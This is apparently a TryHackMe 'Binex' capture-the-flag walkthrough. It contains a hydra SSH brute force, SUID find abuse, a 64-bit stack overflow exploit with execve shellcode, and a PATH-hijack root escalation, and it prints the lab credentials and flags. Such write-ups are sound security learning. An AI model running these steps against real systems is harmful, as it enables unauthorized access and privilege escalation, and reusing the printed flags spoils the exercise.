---
description: https://tryhackme.com/room/binex
---

# Binex

## Task 1 Get initial access

```bash
nmap -n 10.10.131.228
enum4linux 10.10.131.228
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt -t 64 ssh://10.10.131.228
```

![nmap -n 10.10.131.228](<../../.gitbook/assets/Screenshot from 2022-02-21 12-16-42.png>)

![enum4linux 10.10.131.228](<../../.gitbook/assets/Screenshot from 2022-02-21 12-45-22.png>)

![hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt -t 64 ssh://10.10.131.228](<../../.gitbook/assets/Screenshot from 2022-02-21 13-01-22.png>)

{% hint style="success" %}
`tryhackme:thebeset`
{% endhint %}

## Task 2 SUID :: Binary 1

```bash
ssh tryhackme@10.10.131.228
wget http://10.6.9.176/suid3num.py
python suid3num.py
```

![python suid3num.py](<../../.gitbook/assets/Screenshot from 2022-02-21 13-23-52.png>)

```bash
ls -l /usr/bin/find
/usr/bin/find /home/des -type f -name flag.txt -exec cat {} \;
```

![/usr/bin/find /home/des -type f -name flag.txt -exec cat {} ;](<../../.gitbook/assets/Screenshot from 2022-02-21 13-25-13.png>)

{% hint style="success" %}
`THM{exploit_the_SUID}`
{% endhint %}

## Task 3 Buffer Overflow :: Binary 2

```bash
su - des
ls -l
cat bof64.c
```

![](<../../.gitbook/assets/Screenshot from 2022-02-21 13-32-22.png>)

```c
#include <stdio.h>
#include <unistd.h>

int foo() {
	char buffer[600];
	int characters_read;
	printf("Enter some string:\n");
	characters_read = read(0, buffer, 1000);
	printf("You entered: %s", buffer);
	return 0;
}

void main() {
	setresuid(geteuid(), geteuid(), geteuid());
    	setresgid(getegid(), getegid(), getegid());
	foo();
}
```

```bash
gdb -q ./bof
gdb> checksec
gdb> pattern create 1000 pattern.txt
gdb> run < pattern.txt
gdb> pattern search
```

![checksec](<../../.gitbook/assets/Screenshot from 2022-02-21 13-57-15.png>)

![sysctl -a --pattern random](<../../.gitbook/assets/Screenshot from 2022-02-21 15-16-42.png>)

![pattern search](<../../.gitbook/assets/Screenshot from 2022-02-21 14-00-03.png>)

```bash
python2 -c 'print "A" * 616 + "BBBBBB\x00\x00"' > pattern.txt
python2 -c 'print "\x90" * 550 + "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" + "A" * (616 - 550 - 24) + "BBBBBB\x00\x00"' > pattern.txt
(python2 -c 'print "\x90" * 550 + "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" + "A" * (616 - 550 - 24) + "\x80\xe2\xff\xff\xff\x7f\x00\x00"'; cat) | ./bof
```

![disassemble \*foo+48](<../../.gitbook/assets/Screenshot from 2022-02-21 14-40-52.png>)

![x/100x $rsp](<../../.gitbook/assets/Screenshot from 2022-02-21 14-43-48.png>)

```bash
id
python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /home/kel/flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-02-21 14-52-30.png>)

{% hint style="success" %}
`THM{buffer_overflow_in_64_bit}`
{% endhint %}

## Task 4 PATH Manipulation :: Binary 3

#### What is the contents of /root/root.txt?

```bash
su - kel
ls -l 
cat exe.c
```

![](<../../.gitbook/assets/Screenshot from 2022-02-21 15-07-43.png>)

```c
#include <unistd.h>

void main() {
	setuid(0);
	setgid(0);
	system("ps");
}
```

```bash
cp /bin/bash /tmp/ps
PATH=/tmp:$PATH ./exe
cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-02-21 15-13-55.png>)

{% hint style="success" %}
`THM{SUID_binary_and_PATH_exploit}`
{% endhint %}

## Reference

{% embed url="https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow" %}

{% embed url="https://www.youtube.com/watch?v=njaQE8Q_Ems" %}
